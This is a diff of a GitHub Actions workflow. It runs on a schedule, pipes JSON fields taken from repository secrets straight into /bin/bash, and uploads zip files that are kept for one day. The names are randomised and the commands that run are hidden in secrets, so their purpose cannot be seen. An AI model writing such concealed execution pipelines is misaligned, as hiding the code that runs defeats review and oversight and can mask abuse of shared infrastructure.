@@ -1,35 +1,27 @@
 name: tuishouyucu
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '57 0/6 * * *'
 
-jobs:  # 13844
+  schedule:
+    - cron: '54 3,9,15,21 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: tuishouyucu
         env:
-          rbwu4: ${{ secrets.rbwu4 }}
+          h67: ${{ secrets.h67 }}
         run: |
-          echo $rbwu4 | jq -r .a89129 | /bin/bash
-          echo $n7 | jq -r .abl5142 | /bin/bash
-          echo $v397 | jq -r .c20420 | /bin/bash
-          echo $jj4 | jq -r .hwwx3 | /bin/bash
-          echo $wago6 | jq -r .ryrs03558 | /bin/bash
-          echo $ldu76523 | jq -r .qayiu03 | /bin/bash
-          echo $m830 | jq -r .luhk63772 | /bin/bash
-          echo $yzo1146 | jq -r .sk858 | /bin/bash
-          echo $pvbhc1 | jq -r .wnlls53 | /bin/bash
-          echo $hgzb761 | jq -r .u6 | /bin/bash
-          echo $mcpdf00 | jq -r .lxqhz671 | /bin/bash
-          echo $lc13380 | jq -r .ugjv9 | /bin/bash
-          echo $kxifj90673 | jq -r .idpzq53 | /bin/bash
-          echo $omr4 | jq -r .bs1 | /bin/bash
-          echo $lhxw5255 | jq -r .tebob9021 | /bin/bash
-          echo $bp51 | jq -r .yj6750 | /bin/bash
-          echo $u1 | jq -r .psafh2 | /bin/bash
-          echo $qh75 | jq -r .l1 | /bin/bash
-          echo $ywo004 | jq -r .fq3134 | /bin/bash
+          printf '%s' "$h67" | jq -r .x78 | /bin/bash
+          echo $te9 | jq -r .rw2379 | /bin/bash
+          echo $k7108 | jq -r .u64 | /bin/bash
+          echo $swpjj02 | jq -r .oe7 | /bin/bash
+          printf '%s' "$llk83917" | jq -r .yh1 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 0CuL5fCv
+          path: "*.zip"
+          retention-days: 1
